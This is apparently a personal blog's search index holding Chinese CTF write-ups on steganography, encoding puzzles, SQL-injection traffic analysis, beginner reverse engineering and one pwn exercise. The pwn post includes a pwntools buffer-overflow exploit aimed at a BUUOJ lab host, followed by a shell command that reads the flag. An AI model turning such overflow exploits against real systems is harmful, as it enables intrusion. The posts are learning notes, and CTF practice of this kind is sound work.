<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>鲲鹏杯miscwp</title>
    <url>/2021/10/18/%E9%B2%B2%E9%B9%8F%E6%9D%AFmiscwp/</url>
    <content><![CDATA[<h1 id="鲲鹏杯-misc-wp"><a href="#鲲鹏杯-misc-wp" class="headerlink" title="鲲鹏杯 misc wp"></a>鲲鹏杯 misc wp</h1><p>我也不知道这几题到底是misc几，我拿到的只有文件，登不上，怎么都登不上，然后有些试探步骤就不写了，因为忘了</p>
  <span id="more"></span> 

<hr>
<h3 id="1910255db2c8e04f498-zip"><a href="#1910255db2c8e04f498-zip" class="headerlink" title="1910255db2c8e04f498.zip"></a>1910255db2c8e04f498.zip</h3><p>打开，有张图</p>
<p><img src="https://i.loli.net/2021/10/16/tv7ozdZ4KDbgJGR.png" alt="11.png"></p>
<p>用010editor打开，crc报错，所以很可能被修改过</p>
<p><img src="https://i.loli.net/2021/10/16/1rEQKHmtMxhZwVX.png" alt="214.png"></p>
<p>找到长度，改长</p>
<p><img src="https://i.loli.net/2021/10/16/D59CBvnal8ZjdwK.png" alt="33.png"></p>
<p>其实已经可以找到flag了</p>
<p><img src="https://i.loli.net/2021/10/16/VHicnSWAvFQZdbs.png" alt="444.png"></p>
<p>放大就能看到，有点暗</p>
<p><img src="https://i.loli.net/2021/10/16/S8Nbky17LZzDCtG.png" alt="3.png"></p>
<p>也可以用stegsolve切一下通道，有些就可以很明显地看到flag，但是那样的话长度不能改太长，不然放不进去，改个差不多的就行</p>
<p><img src="https://i.loli.net/2021/10/16/ftbpNr2gC13PIem.png" alt="Q41.png"></p>
<hr>
<h3 id="5afea376cfc75-zip"><a href="#5afea376cfc75-zip" class="headerlink" title="5afea376cfc75.zip"></a>5afea376cfc75.zip</h3><p>打开，看到一张，只有黑白，所以显得大小不太对的图</p>
<p><img src="https://i.loli.net/2021/10/16/HDbAPGVjUkOT4xR.png" alt="2414.png"></p>
<p>010打开，我发现我看不懂，那就不手动提了</p>
<p><img src="https://i.loli.net/2021/10/16/IxHbj4nkc6Y3tGZ.png" alt="BUA.png"></p>
<p>上foremost</p>
<p><img src="https://i.loli.net/2021/10/16/LtaOmQeHGTIDx29.png" alt="L86.png"></p>
<p>拿到压缩文件，有加密，而且flag.txt没啥有用的东西</p>
<p><img src="https://i.loli.net/2021/10/16/vHqOoW6g4PSNMzd.png" alt="RX.png"></p>
<p>ziperello不知道为什么读取不了，那用archpr</p>
<p>密码是1020</p>
<p>然后gif真的是gif，而且下棋的是真的慢</p>
<p>用stegsolve的这个功能，翻到一个不一样的</p>
<p><img src="https://i.loli.net/2021/10/16/L1hHswOWpTifRkM.png" alt="9K.png"></p>
<p><img src="https://i.loli.net/2021/10/16/zuqO6jlAVvSCM8n.png" alt="NLU.png"></p>
<p>保存下来 再用stegsolve打开，直接翻一翻</p>
<p>拿到二维码，扫了就有flag</p>
<hr>
<h3 id="1910255db2c8ea4e4d0-png"><a href="#1910255db2c8ea4e4d0-png" class="headerlink" title="1910255db2c8ea4e4d0.png"></a>1910255db2c8ea4e4d0.png</h3><p>直接打开→打不开</p>
<p>用010editor/记事本打开</p>
<p>就挺常见易懂的base64转图片</p>
<p><img src="https://i.loli.net/2021/10/16/bvc2wPHDjUIhf1M.png" alt="11B17.png"></p>
<p>搜一下在线工具</p>
<p>拿到二维码</p>
<p><img src="https://i.loli.net/2021/10/16/GQTPovgLHkwy5aV.png" alt="ZRSE.png"></p>
<p>扫一下就有一串base64，转一下就有flag</p>
<hr>
<p>拿到题的时候，时间不多了，有点急，甚至手滑把editor参数栏关了之后更着急地找了半天，甚至没有当场看到 真正的ctf选手.png那题 藏在暗处的flag</p>
]]></content>
  </entry>
  <entry>
    <title>鹤城杯的一些题</title>
    <url>/2021/10/11/%E9%B9%A4%E5%9F%8E%E6%9D%AF%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%98/</url>
    <content><![CDATA[<p>虽然比赛群里都说这比赛都是原题，但是我没做过原题，而且给的re也太难了，记录一下别的能看得懂的</p>
<span id="more"></span> 

<h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p>公正公正公正诚信文明公正民主公正法治法治诚信民主自由敬业公正友善公正平等平等法治民主平等平等和谐敬业自由诚信平等和谐平等公正法治法治平等平等爱国和谐公正平等敬业公正敬业自由敬业平等自由法治和谐平等文明自由诚信自由平等富强公正敬业平等民主公正诚信和谐公正文明公正爱国自由诚信自由平等文明公正诚信富强自由法治法治平等平等自由平等富强法治诚信和谐</p>
<p>直接扔进社会主义核心价值观编码器就完事了。</p>
<hr>
<h3 id="a-misc"><a href="#a-misc" class="headerlink" title="a_misc"></a>a_misc</h3><p><img src="https://i.loli.net/2021/10/11/VK4agfYI2vGt3CO.png" alt="check.png"></p>
<p>一只猫</p>
<p><img src="https://i.loli.net/2021/10/11/fCcQhFDMnd1GpbW.jpg" alt="E2F.jpg"></p>
<p>一只经常营业的土耳其梵猫</p>
<p>↑然后这个没啥用</p>
<p>扔进Stegsolve，0通道下长成这样那肯定有东西</p>
<p><img src="https://i.loli.net/2021/10/11/CQTLapjAvqmBfFb.png" alt="N222.png"></p>
<p>确实有东西</p>
<p><img src="https://i.loli.net/2021/10/11/CABF5jdIkbqoVn7.png" alt="U4PSV_9GET~1DPVJ4~_P4Z4.png"></p>
<p>转码拿到flag</p>
<ul>
<li>这题问了学姐，然后得到回应 “这题出的很常规”  就直接把题秒了</li>
<li>可我目前能找到的鹤壁杯的wp里都找不到这题，学姐tql</li>
</ul>
<hr>
<h3 id="a-crypto"><a href="#a-crypto" class="headerlink" title="a_crypto"></a>a_crypto</h3><p>转码套娃</p>
<p>4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</p>
<p>rot13→base16→base32→base64</p>
<p>然后就转不动了，说是要去混淆，但没有详细说怎么操作，等我了解了再来编辑</p>
<p>编辑：装完ciphey，秒了</p>
<hr>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>这题比较简单，但是我赛后才懂具体怎么操作</p>
<p><img src="https://i.loli.net/2021/10/11/PfSvRW6JHy3kq8n.png" alt="333333.png"></p>
<p>找到这些sql盲注流量，然后取从33重新开始的前一个，ascii码转一下，就得到flag了</p>
<hr>
<ul>
<li>这个比赛re方向的题对我来说太难了，出了wp希望可以试着复现一下</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>尝试复现pwn入门题的wp</title>
    <url>/2021/10/03/%E5%B0%9D%E8%AF%95%E5%A4%8D%E7%8E%B0pwn%E5%85%A5%E9%97%A8wp/</url>
    <content><![CDATA[<p>很不了解，很想尝试，顺便借复现wp补充工具，于是试了一道题</p>
<span id="more"></span> 

<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><h3 id="一、看题"><a href="#一、看题" class="headerlink" title="一、看题"></a>一、看题</h3><p>给一个附件和一个靶机地址</p>
<p><del>rip应该不至于是rest in peace吧</del></p>
<p>用ida打开，</p>
<p><img src="https://i.loli.net/2021/10/02/3Sdi9lHN7jnhy2q.png" alt="11.png"></p>
<p>看到了gets()函数，很巧，我知道有个关于它的漏洞</p>
<p><img src="https://i.loli.net/2021/10/02/UJeBrmaSkE6z9XK.png" alt="4.png"></p>
<p>然后看看gets()的地址附近有没有什么东西</p>
<p><img src="https://i.loli.net/2021/10/02/uPWkTcSzGqiQXY1.png" alt="55.png"></p>
<p>有个奇怪的函数</p>
<p>好了，不会了</p>
<h3 id="二、看wp"><a href="#二、看wp" class="headerlink" title="二、看wp"></a>二、看wp</h3><p>思路确实是，利用gets()，把溢出的覆盖到所谓的后面函数。</p>
<p>exp不会写，wp有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27327</span>) //连接靶机地址</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>)+p64(<span class="number">0x401187</span>) //这里的f+<span class="number">8</span>可以靠工具计算，也可以直接数，但是我不熟</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="三、尝试复现"><a href="#三、尝试复现" class="headerlink" title="三、尝试复现"></a>三、尝试复现</h3><p>于是，又要在不同的报错中，配置虚拟机pwn环境</p>
<p>该装上的都装上后，cd到脚本当前目录，运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 pwn2.py</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/02/Tf4YtvuNlJzjB5R.png" alt="D.png"></p>
<p>好，果然又报错了，查如何解决</p>
<p>使用p64()时在后面加上.decode(‘unicode_escape’)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>再次运行</p>
<p><img src="https://i.loli.net/2021/10/02/Z3NOeQscWDpIECU.png" alt="25.png"></p>
<p>接上了，但是wp结束了，不过下面的操作不用wp我应该也能做了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/02/8WbESJKUB9lICRm.png" alt="J.png"></p>
<hr>
<h2 id="心路历程"><a href="#心路历程" class="headerlink" title="心路历程"></a>心路历程</h2><p>中间有好多次想直接放弃了，毕竟要装的东西太多了，要了解的东西太多了，很多次我觉得，我遇到的问题可能会简单到不会有具体步骤，会一直卡着我，要不再看点基础吧，但是我也不知道为啥还是坚持硬复现完了。挺好。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>buu的一道纠结了很久的题</title>
    <url>/2021/09/30/buu%E7%9A%84%E4%B8%80%E9%81%93%E7%BA%A0%E7%BB%93%E4%BA%86%E5%BE%88%E4%B9%85%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<p>一道题纠结了很久，但也没弄的非常明白，记录，希望以后可以变得更强</p>
<span id="more"></span> 

<h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>打开程序，只有一个窗口，于是用ida打开，看到没有自动识别出main函数，但是找到了和加密很有关系的函数。</p>
<p><img src="https://i.loli.net/2021/09/30/ScriaNvsnfIDPhM.png" alt="1.png"></p>
<p>8位数，然后看看加密后6位的函数，加密方式长得很像base64（因为我写不出base64转换，但知道它是怎么转的，所以不确定）</p>
<p>然后shift+F12在字符串看到了base64替换表，那应该确实是了</p>
<p><img src="https://i.loli.net/2021/09/30/eNk1WmfwPxJvQ7d.png" alt="2.png"></p>
<p>于是得到**WP1jMp</p>
<p>前两位</p>
<p><img src="https://i.loli.net/2021/09/30/uXjVCEZ3ap1P8Gl.png" alt="`QXB`O6S5RTP6_V__T_JZNR.png"></p>
<p><img src="https://i.loli.net/2021/09/30/XzVwHgiqGaBCjbQ.png" alt="5P.png"></p>
<p>我把90+34 67 直接转成字符，提交，flag不对。</p>
<p>于是注意到<img src="https://i.loli.net/2021/09/30/BVOHYq1KLPoSmG2.png" alt="5.png"></p>
<p>有一个sub_4010F0函数，点开</p>
<p><img src="https://i.loli.net/2021/09/30/sjc6PXDBGynflbr.png" alt="_KK__X7GJB9C_X~_J~8347H.png"></p>
<p>看不懂，尝试弄个一个意思的代码，试试调试，结果不仅看不懂，放进c还跑不动，改完报错的地方还是跑不动，并且理解不了思路，写不出来，捣鼓了挺长时间→查wp→这是个排序用的函数，但是我还是看不懂。</p>
<p>于是找到了别人怎么把它写成c（找到的网页默认不允许选中，于是我用ctrl+a ctrl+c复制了所有文字然后把我想要的拿了出来）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">   <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">   <span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span> <span class="comment">// int a1</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">     <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">     <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">     <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">   </span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = i; <span class="comment">//v5 = 4 * i 这一行为什么要改？求大佬指教 </span></span><br><span class="line">      v6 = a1[i]; <span class="comment">//v6 = *(_DWORD *)(4 * i + a1)</span></span><br><span class="line">      <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &gt; a1[result] ) <span class="comment">//v6 &gt; *(_DWORD *)(a1 + 4 * result)</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            ++i;</span><br><span class="line">            a1[v5] = a1[result]; <span class="comment">//*(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + 4 * result)</span></span><br><span class="line">            <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">while</span> ( a1[i] &lt;= v6 ) <span class="comment">// *(_DWORD *)(a1 + 4 * i) &lt;= v6</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v5 = i; <span class="comment">//v5 = 4 * i </span></span><br><span class="line">            a1[result] = a1[i]; <span class="comment">// *(_DWORD *)(a1 + 4 * result) = *(_DWORD *)(4 * i + a1)</span></span><br><span class="line">          &#125;</span><br><span class="line">          --result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">      &#125;</span><br><span class="line">  LABEL_13:</span><br><span class="line">      a1[result] = v6; <span class="comment">//*(_DWORD *)(a1 + 4 * result) = v6</span></span><br><span class="line">      sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">      result = a3;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">20</span>] = &#123;<span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     sub_4010F0(str,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其实我还是不是很懂思路，所以还是放在这以后看，如果有看得懂思路且有信心教会我的好心人请直接来教教我！</p>
<p>排序完再转换就得到了前2位，于是得到flag</p>
<hr>
<p>把看不懂的反汇编出的代码写成跑得动、能一步一步看结果的代码的能力真的很重要！</p>
]]></content>
  </entry>
  <entry>
    <title>Buu re 01</title>
    <url>/2021/09/26/Buu%20re/</url>
    <content><![CDATA[<h1 id="尝试Buu的入门re题"><a href="#尝试Buu的入门re题" class="headerlink" title="尝试Buu的入门re题"></a>尝试Buu的入门re题</h1><p>因为题比较入门，所以做的比较轻松</p>
<span id="more"></span> 

<h2 id="一、easyre"><a href="#一、easyre" class="headerlink" title="一、easyre"></a>一、easyre</h2><p>打开就能看到flag</p>
<p><img src="https://i.loli.net/2021/09/25/quEIinget3vWcdU.png" alt="POJY9S_2~A3MW4UEG58J5A1.png"></p>
<hr>
<h2 id="二、新年快乐"><a href="#二、新年快乐" class="headerlink" title="二、新年快乐"></a>二、新年快乐</h2><p>查壳→查到upx壳→脱壳→打开</p>
<p><img src="https://i.loli.net/2021/09/25/khpRxfMbBN8QIVy.png" alt="V_ZG_WZO7GQ7_5E_J9_Y3P6.png"></p>
<p>可以看到输入和HapperNewYear! 一样时，输出this is true flag </p>
<p>所有得到flag为HapperNewYear!</p>
<h2 id="三、reverse1"><a href="#三、reverse1" class="headerlink" title="三、reverse1"></a>三、reverse1</h2><p>打开后，按F5，查看伪代码</p>
<p><img src="https://i.loli.net/2021/09/25/iySD8vUj96mwadY.png" alt="_Y_YCF9_M6G7___H6RGQ6JG.png"></p>
<p>看出要使输入和Str2一样，双击Str2</p>
<p><img src="https://i.loli.net/2021/09/25/ecoLPTbzHdChp4r.png" alt="PG6U_JNO8DVOU_QH6EBT@3K.png"></p>
<p>再往上看</p>
<p><img src="https://i.loli.net/2021/09/26/GMN67sr3fCRDxAO.png" alt="Z_J0__MD_I_7SK`84_`W7_4.png"></p>
<p>有一个逐个替换数组内元素的循环</p>
<p>按R直接转字符</p>
<p><img src="https://i.loli.net/2021/09/25/7T83kof6DxPhtKr.png" alt="T_`VSV~___P4DTG@YD`16_H.png"></p>
<p>看出是把o换成0</p>
<p>得到flag</p>
<ul>
<li>其实再往上看，有一个看不懂赋值，看不懂结束条件，且用c跑不动的循环，也没发现在转伪代码前对应的汇编指令，问了学长，可能是代码混淆。</li>
</ul>
<p><img src="https://i.loli.net/2021/09/25/yYKFcEBX4t8vquP.png" alt="__5WVI_9_P8MX9JMHTGG_8J.png"></p>
<hr>
<h2 id="四、reverse2"><a href="#四、reverse2" class="headerlink" title="四、reverse2"></a>四、reverse2</h2><p>打开看到下面这些</p>
<p><img src="https://i.loli.net/2021/09/26/raveS7dAM1FbDog.png" alt="3.png"></p>
<p>双击flag</p>
<p><img src="https://i.loli.net/2021/09/26/qas2xBAUEco6mJy.png" alt="K_6_QE6LHX7V1E~ZVL2_@_6.png"></p>
<p>r键 7Bh转成 ’ { ‘</p>
<p><img src="https://i.loli.net/2021/09/25/NhDoeL3ARUdjXEC.png" alt="4YR07_MLB`_`YQKY9A_U_FX.png"></p>
<p>再回到原本的伪代码</p>
<p><img src="https://i.loli.net/2021/09/26/Lvi8E7UBQDMRr1j.png" alt="444446R.png"></p>
<p>看到逐个把i r 换成1的循环</p>
<p>得到flag</p>
<hr>
<h2 id="五、内涵的软件"><a href="#五、内涵的软件" class="headerlink" title="五、内涵的软件"></a>五、内涵的软件</h2><p><img src="https://i.loli.net/2021/09/26/wEDF93NqdmfAKzn.png" alt="1@XSX_P8J___CI3B@R0__YB.png"></p>
<p>打开，看到 下文没有提到的变量就v5了，但是外面的是DBAPP，想不到有什么转码能把这个转成flag，但是又找不到别的信息，于是直接提交，失败，改成flag提交，成功</p>
<hr>
<h2 id="六、xor"><a href="#六、xor" class="headerlink" title="六、xor"></a>六、xor</h2><p>其实也只是简单的用了异或算法</p>
<p><img src="https://i.loli.net/2021/09/26/vVCb851LakRiEwS.png" alt="~6_XS6XQG_S052U4H5___Y5.png"></p>
<p>打开global看有哪些字符</p>
<p><img src="https://i.loli.net/2021/09/26/rwc7omIaqtMsL8T.png" alt="XG__YA_5@FJNXPVG_0_V6DI.png"></p>
<p>把算法抄下来，结果输出乱码了，于是多加了个f[]数组，就行了</p>
<p><del>虽然输出还是少个f，自己加上就行</del></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> __b[<span class="number">264</span>]=&#123;<span class="string">&#x27;f&#x27;</span>,<span class="number">0xA</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0xD</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xE</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0xF</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;O&#x27;</span>&#125;;</span><br><span class="line">   <span class="keyword">char</span> f[<span class="number">100</span>]; </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )&#123;</span><br><span class="line">     __b[i] = <span class="keyword">char</span>(__b[i]);</span><br><span class="line">    f[i]=__b[i] ^ __b[i - <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,f[i]);   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天做的很基础，很入门，很相似，提升地只有一点点看代码的能力，和一点点写c语言脚本的能力</p>
<p>和在比赛里看到的题目比，差很多</p>
<ul>
<li>写这篇时有些图片名称是乱码，有可能会触发格式导致图片显示不了，可以靠直接改掉图片名解决</li>
</ul>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界re新手区部分记录</title>
    <url>/2021/09/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p> 初学，尝试</p>
<span id="more"></span> 

<h3 id="一、Hello-CTF"><a href="#一、Hello-CTF" class="headerlink" title="一、Hello, CTF"></a>一、Hello, CTF</h3><p>拿到一个程序，打开，</p>
<p><img src="https://i.loli.net/2021/09/23/VjUvLRGey9w6tWd.png" alt="2.png"></p>
<p>好，没啥东西，查壳</p>
<p><img src="https://i.loli.net/2021/09/23/zHMpEtha3oJlXFP.png" alt="3.png"></p>
<p>好，没壳，开他</p>
<p><img src="https://i.loli.net/2021/09/23/Zsuilz894rbfJWv.png" alt="4.png"></p>
<p>有很多看不懂的函数，但是可以看到，触发成功的条件是，v10=v13，这俩都是数据类型为字符的数组。虽然有些函数不认识但大致可以猜到输入从v9，v4，v10。</p>
<p>v13在这</p>
<p><img src="https://i.loli.net/2021/09/23/SQwE9idntPBaH2D.png" alt="5.png"></p>
<p>看着像16进制，转换，结束。</p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><ul>
<li>memset() 函数 初始化内存，这里memset(v10,0,sizeof(v10))表示把数组v10内容全换成0。</li>
<li>sprintf()函数 ，把格式化输出转入字符串，查了之后才发现原来是在这里转成16进制的。</li>
</ul>
<hr>
<h3 id="二、insanity"><a href="#二、insanity" class="headerlink" title="二、insanity"></a>二、insanity</h3><p><del>既然它都insanity了，那我当然可以直接拿txt打开</del></p>
<p>直接拿ida打开搜一搜flag也行</p>
<hr>
<h3 id="三、re1"><a href="#三、re1" class="headerlink" title="三、re1"></a>三、re1</h3><p>查壳→没壳</p>
<p>ida开他！</p>
<p><img src="https://i.loli.net/2021/09/23/jOVyTQZphXr6Scl.png" alt="6.png"></p>
<p>这些后面的if太怪了，假设它是道正常题目，从输入看，v9和v5有关系，v5的赋值里有个可以双击的东西</p>
<p> 双击，找到断成两截还反序了的flag。<img src="https://i.loli.net/2021/09/23/enVtQrdmqZ2huUx.png" alt="image-20210923204523796.png">这里的反序后面看了wp，也不太了解，只是知道这里的数据采用小端存储。</p>
<p><strong>高位字节在高位地址，低位字节在低位地址</strong></p>
<hr>
<h3 id="四、open-source"><a href="#四、open-source" class="headerlink" title="四、open-source"></a>四、open-source</h3><p>附件是c语言源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看得懂代码就好做，总之思路就是绕过重重if，顺便得到 fist second argv[3]都对应什么。</p>
<ol>
<li>first != 0xcafe →i am wrong，所以 first = 0xcafe</li>
<li>second需要符合 和5求余不等于3 和17求余等于8，我写了个代码</li>
</ol>
